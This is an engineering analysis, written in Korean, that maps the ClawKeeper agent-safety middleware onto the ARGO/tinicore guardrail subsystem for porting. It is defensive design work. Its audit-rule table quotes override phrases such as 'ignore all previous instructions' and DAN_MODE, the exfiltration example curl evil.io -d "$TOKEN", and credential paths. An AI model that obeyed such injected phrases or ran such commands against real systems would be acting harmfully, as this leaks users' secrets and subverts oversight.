# ClawKeeper × ARGO 분석 (2026-09-02)

세션: "ClawKeeper 의 ARGO 포팅". `~/Works/hermes-agent`(NousResearch, AI 에이전트 CLI)와
`~/Works/ClawKeeper`(안전 미들웨어)를 조사하고, 이를 ARGO(`~/Works/ARGO-ClawKeeper`,
`dev/byungchul.so/clawkeeper` 브랜치)의 `tinicore/src/guardrails/`로 가져오는 방안을
분석한 기록. 실제 포팅 계획은 별도 문서
[`20260902-clawkeeper-tinicore-porting-plan.md`](./20260902-clawkeeper-tinicore-porting-plan.md) 참고.

---

## 0. 저장소 식별 — 중요한 정정

`ClawKeeper`라는 이름으로 두 개의 무관한 저장소가 존재한다.

| | `github.com/rad-security/clawkeeper` | `github.com/SafeAI-Lab-X/ClawKeeper` |
|---|---|---|
| 언어 | Bash | Python |
| 정체 | AI 에이전트 **호스트**(OpenClaw)용 보안 스캐너. 방화벽/FileVault/열린 포트 등 OS 하드닝 체크 + `runtime-shield`(OpenClaw 전용 프롬프트 인젝션 방어 플러그인, TS) | "Host-agnostic safety middleware for tool-using agentic systems" — 에이전트와 툴 사이에 끼어 위험한 툴 호출을 차단하는 미들웨어. Hermes/MCP/OpenClaw 등 여러 호스트 타겟 |
| hermes-agent 연관 | 없음 (`web/package-lock.json`의 `hermes-parser`는 Meta JS 엔진 Hermes, 별개) | **`docs/HERMES_INTEGRATION.md`, `clawkeeper_core/adapters/hermes.py` 존재** — hermes-agent 실제 소스 구조(콜백 시그니처, 훅 이름)와 정확히 일치 검증됨 |

처음 `rad-security/clawkeeper`를 clone했다가, hermes-agent와 무관함을 확인 후
`SafeAI-Lab-X/ClawKeeper`로 다시 clone. 이하 "ClawKeeper"는 후자를 가리킨다.

---

## 1. ClawKeeper(SafeAI-Lab-X) 개요

### 하는 일
에이전트-툴 사이에서: 위험한 툴 호출 차단, 민감한 툴 결과 redact, 반복 공격 패턴 학습,
필요시 외부 Watcher(LLM 기반)에 트래젝토리 레벨 판단 위임.

### hermes-agent 연결 지점 3곳 (`clawkeeper_core/adapters/hermes.py`)

| 지점 | hermes 쪽 위치 | 언제 발동 | 역할 |
|---|---|---|---|
| `set_approval_callback` | `tools/terminal_tool.py:301`, `tools/computer_use/tool.py:69` | hermes 자체 정규식이 "위험"으로 flag했을 때만 | Judge가 최종 allow/deny |
| `tool_start_callback`/`tool_complete_callback` | `run_agent.py:467` `AIAgent.__init__` | 모든 툴 호출마다 | 선제 가드 체인 + 관찰 로그 |
| `pre_tool_call` 플러그인 훅 | `hermes_cli/plugins.py:7030` `_ensure_plugins_discovered()` | 모든 툴 호출 직전 | hermes 정규식이 놓친 것(heredoc 등)까지 차단 |

세 지점 모두 실제 hermes-agent 소스(`tools/terminal_tool.py:301`, `tools/computer_use/tool.py:69`,
`run_agent.py:467`, `hermes_cli/plugins.py:7030`)와 대조 검증 완료 — 정확히 일치.

### 가드 8종 (`clawkeeper_core/guards/`)

| 가드 | 방어 대상 |
|---|---|
| `exec_gate` | 위험한 shell 명령 정규식 49개 |
| `path_guard` | 보호 경로 glob 7개 (`~/.ssh/**`, `~/.aws/**`, `/etc/shadow` 등) |
| `url_safety` | SSRF(사설망/클라우드 메타데이터), 호모글리프 URL(키릴 문자 위장 도메인) |
| `script_body_scan` | 동적으로 조립되는 경로(`Path.home()/'.aws'/'credentials'`) — path_guard가 못 보는 것 |
| `return_content_scan` | 툴 실행 결과에 섞인 프롬프트 인젝션 문구, invisible 문자, base64→shell |
| `credential_redact` | GitHub/AWS/OpenAI/Anthropic/JWT/SSH키 등 시크릿 패턴 9종, 마스킹 |
| `input_validator` | JSON 스키마 검증 |
| `budget` | 토큰 사용량 추적 |

### 스스로 인정하는 방어 한계 (`tests/redteam/THREAT_MODEL.md`, 10개 위협 클래스)

메모리 인젝션, 공급망 공격(`pip install --index-url`), 스킬 마켓플레이스 PI,
승인 메커니즘 자체 잭브레이크 — 구멍으로 명시. 다중 턴 누적 drift는 "잡을 수 있다고 주장"
하나 실측 검증 전.

---

## 2. ARGO 기존 가드 서브시스템 전체 인벤토리

### A. 값 탐지 → 마스킹/차단 축

| # | 컴포넌트 | 위치 | 하는 일 | 활성화 상태 |
|---|---|---|---|---|
| A1 | PII 엔진 | `tinicore/src/guardrails/{filter,recognizer,detector,handwritten/}.rs` | 49종 인식기(카드번호, SSN, AWS/GitHub/Stripe/Slack/GCP 등 시크릿 40여종), `deidentifier_config`로 마스킹 | `guardrails` feature 기본 **OFF** |
| A2 | `SensitiveDetector` 트레잇 | `tinicore-traits/src/sensitive.rs:344` | 탐지기 계약. 워크스페이스 전체 실제 구현은 A1의 `PiiSpanDetector`(`guardrails/detector.rs:475`) **하나뿐** | — |
| A3 | `DetectorChain` | `tinicore/src/sensitive/chain.rs` (792줄) | 탐지기 N개를 하나로. `detect_all`(마스킹, 전원 통과)/`detect_any`(차단, 첫 히트 중단) | feature `sensitive` 기본 **ON** (탐지기 없으면 무용) |
| A4 | redaction vault | `tinicore/src/sensitive/redaction.rs` (1846줄) | 마스킹↔복원 라운드트립 | 위와 동일 |
| A5 | `EgressMask` | `tinicore/src/agent/pii_masking.rs` | LLM 송신 직전 마스킹 지점(`llm/client.rs:527,1096,2989`) | 위와 동일 |
| A6 | exfil needles | `tinicore/src/agent/guardrails_exfil/secret_needles.rs` (271줄) | env의 **이미 아는 값**이 출력에 나오면 경보 | `guardrails_exfil` 팩, 기본 **OFF** |

`PiiSpanDetector`가 워크스페이스 유일의 실제 `SensitiveDetector` 구현이고(나머지는 전부
테스트 더블), `pii_masking.rs`는 이를 `Arc<dyn SensitiveDetector>`로 제네릭하게만 받는다.
**파이프라인은 기계장치, 내용물은 PII 엔진 하나.** `sensitive`는 기본 ON, `guardrails`는
기본 OFF이므로 기본 상태에서 탐지 0건. `chain.rs`가 다중 탐지기 조합을 명시적으로 상정:

```
capable host      DetectorChain[ ModelHead ]
constrained host  DetectorChain[ RegexPii, CredScan, Needles ]
mixed             DetectorChain[ RegexPii, ModelHead ]
```

### B. 지시문/공격패턴 탐지 → 툴 호출 차단 축

| # | 컴포넌트 | 위치 | 하는 일 | 활성화 상태 |
|---|---|---|---|---|
| B1 | G1 arg-shape | `guardrails_tool_input/mod.rs` | 카탈로그 밖 툴, 필수 인자 누락 | `guardrails_tool_input` 팩, env 없으면 기본 **OFF** |
| B2 | G2 command_safety | `guardrails_tool_input/command_safety.rs` (1859줄) | argv 파싱 화이트리스트. safe/dangerous/unknown 3상태 | 위와 동일 |
| B3 | G3 secret_path | `guardrails_tool_input/secret_path.rs` (573줄) | `.aws/credentials` 등 세밀한 예외 포함 경로 차단 | 위와 동일 |
| B4 | G4 path_boundary | `guardrails_tool_input/path_boundary.rs` (407줄) | 쓰기 대상 경계 이탈 | 위와 동일 |
| B5 | url_scan(추출) | `guardrails_exfil/url_scan.rs` (1377줄) | URL 추출 + 제로클릭 이미지 유출 탐지 | `guardrails_exfil` 팩, 기본 **OFF** |
| B6 | `audit_text()` | `dispatchable_policy/audit.rs:1016` | 23룰/6카테고리 — 아래 상세 | 함수는 항상 컴파일, **호출부가 등록 시점 2곳뿐** |
| B7 | ToolOutputGuardrail 배선 자리 | `tools/tool_orchestrator/execution.rs:3206` | "간접 프롬프트 인젝션 경계"로 주석에 명시된 실제 배선 지점 | 코드는 있으나 `set.tool_output`이 **비어서 미실행** |
| B8 | Untrusted 프롬프트 격리 | `tool_orchestrator/execution.rs` `post_execute`, `TrustTier::Untrusted` | 차단 아닌 **태깅** — 미등록/외부 툴 결과를 "믿을 수 없음" 봉투로 감쌈 | 항상 켜짐 |
| B9 | bidi/invisible 유틸 | `tinicore/src/skills/mod.rs:678` | **스킬 ID 문자열**에 한정된 좁은 용도 | 스킬 ID 처리 경로에서 항상 |

#### B6 상세 — `audit_text()`

`tinicore/src/dispatchable_policy/audit.rs` (2313줄). runkids/skillshare `internal/audit`를
Rust로 이식. `pub fn audit_text(text: &str, source: &Path) -> AuditReport`.

| 카테고리 | 룰 수 | 내용 | ClawKeeper 대응 |
|---|---|---|---|
| `PromptInjection` | 4 | "ignore all previous instructions", `SYSTEM: override`, `DAN_MODE`, `<system>` 태그 | `override` |
| `DataExfiltration` | 4 | `curl evil.io -d "$TOKEN"`, 쿼리파라미터 붙은 외부 이미지 | `embedded_directive` |
| `CredentialAccess` | 8 | ssh-private-key, aws, github-pat/actions, **anthropic-key**, **openai-key**, google, slack | `credential_redact` |
| `InvisiblePayload` | 2 | Unicode tag `U+E0001-E007F` (Pillar Security "Rules File Backdoor") | `invisible_chars` |
| `Obfuscation` | 3 | base64/hex→shell, ANSI 이스케이프 | `base64_decoded_to_shell` |
| `Privilege` | 2 | `chmod 777`, setuid root | — |

호출자: `tools/registry/store.rs:418`, `dispatchable_policy/discovery.rs:731` —
**스킬/툴 매니페스트 등록 시점에만.** 런타임 툴 실행 결과에는 아무도 안 부름.

#### B7 상세 — 배선 자리는 있는데 비어 있음

```rust
// tools/tool_orchestrator/execution.rs:3206
// Guardrails — TOOL-OUTPUT layer (Phase 1). Runs at the single shared
// post-dispatch site so every dispatch path (batch, single, streaming)
// inherits it. A tripwire REPLACES the tool result with the guardrail's
// message before it can re-enter the model context — this is the
// indirect-prompt-injection boundary (untrusted data arriving via a tool
// result). Chains come from the process-global set; empty ⇒ zero cost.
if let Some(set) = crate::agent::guardrails::global_guardrails() {
    if !set.tool_output.is_empty() {
        let data = tinicore_traits::ToolGuardrailOutput { ... };
        if let Err(e) = tinicore_traits::run_tool_output_guardrails(&set.tool_output, &data).await {
            // 여기서 걸리면 결과가 통째로 에러 메시지로 교체됨
        }
    }
}
```

트레잇 (`tinicore-traits/src/guardrail.rs:980`):

```rust
#[async_trait::async_trait]
pub trait ToolOutputGuardrail: Send + Sync {
    fn name(&self) -> &str;
    async fn check(&self, data: &ToolGuardrailOutput<'_>) -> GuardrailResult;
}
```

`ToolOutputGuardrail` 구현체가 워크스페이스에 **하나도 없다.** 자리는 있는데 세입자가 없는 상태.

---

## 3. ClawKeeper 8종 × ARGO 대응표 (결론)

| ClawKeeper 가드 | 대응 ARGO 컴포넌트 | 관계 |
|---|---|---|
| `exec_gate` | B2 command_safety | ARGO가 더 강함(화이트리스트+argv파싱 vs 블랙리스트 정규식) |
| `path_guard` | B3+B4 secret_path/path_boundary | ARGO가 더 세밀 |
| `input_validator` | B1 G1 arg-shape | 커버됨 |
| `budget` | 없음 | 가드가 아니고 `Path::home()`/env 읽기가 Core 규칙 위반이라 포팅 자체 안 함 |
| `url_safety` | B5 url_scan(추출만) | 추출만 겹침, SSRF/호모글리프 판정은 ARGO에 없음 → 신규 필요 |
| `credential_redact` | A1(PII 49종) + B6(audit CredentialAccess 8종) + A6(needles) | 세 겹으로 커버 |
| `return_content_scan` | B6(룰 있음) + B7(배선 자리 있음, 비어있음) | 탐지기·자리 둘 다 있는데 연결만 안 됨 |
| `script_body_scan` | 없음 | 정말 대응물 없음 → 신규 필요 |

**결론: 진짜 신규로 짤 코드는 `script_body_scan`과 `url_safety`의 SSRF/호모글리프 판정
둘뿐.** `return_content_scan`은 B6을 B7 트레잇으로 감싸는 어댑터 — 새 정규식 0개.
나머지 5개는 ARGO가 이미 동등 이상으로 갖고 있어 이식하지 않는다.

---

## 4. 부수 발견 — "구현은 있는데 기본 꺼짐" 패턴

`install_guardrails_from_env`(`agent/guardrails.rs:1020`)는 tool-input/exfil 팩을
`{PREFIX}_GUARDRAIL_TOOL_PACK` / `_EXFIL` 환경변수에 JSON이 있을 때만 설치한다. 레포 전체에
이 환경변수를 기본 세팅하는 곳이 없다(설치 경로는 `tinicli/src/cli_entry.rs:158`,
`tiniffi/src/lib.rs:28645` 둘뿐, 둘 다 설정 기반). Core 레이어 규칙
("Core는 정책을 하드코딩하지 않는다")의 결과다.

**사용자 체감 갭의 진짜 원인은 "구현 부재"가 아니라 "기본 정책 미배포"일 가능성이 크다.**
이는 이번 포팅 라운드보다 보안 효과 측면에서 영향이 클 수 있는 후속 과제.

---

## 참고: 세션 중 만든 워크스페이스

- `~/Works/ClawKeeper` — `SafeAI-Lab-X/ClawKeeper` (Python)
- `~/Works/hermes-agent` — `NousResearch/hermes-agent`
- `~/Works/ARGO-ClawKeeper` — ARGO worktree, `dev/byungchul.so/clawkeeper` 브랜치 (main에서 분기)
